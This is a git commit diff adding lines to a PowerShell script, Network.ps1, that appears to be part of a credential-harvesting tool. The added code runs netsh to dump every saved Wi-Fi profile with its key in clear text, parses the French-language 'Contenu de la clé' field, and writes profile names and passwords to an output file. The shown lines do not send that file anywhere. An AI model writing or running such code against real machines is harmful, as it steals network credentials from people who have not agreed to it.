6f46437267eebf3021452204ba3546040f0cfb32
LabSeb <35532325+SnowGlobeio@users.noreply.github.com>
2023-07-12 15:24:35 +0200

    Update Network.ps1

--- Network.ps1
+++ Network.ps1
@@ -54,6 +54,9 @@ $wifilist = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Ma
 
 $wifilist >> $FileName
 
+$wifilist = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+$wifilist >> $FileName
 ############################################################################################################################################################
 
 #--------------------------------------------------------------------------------------------------------------------------------------
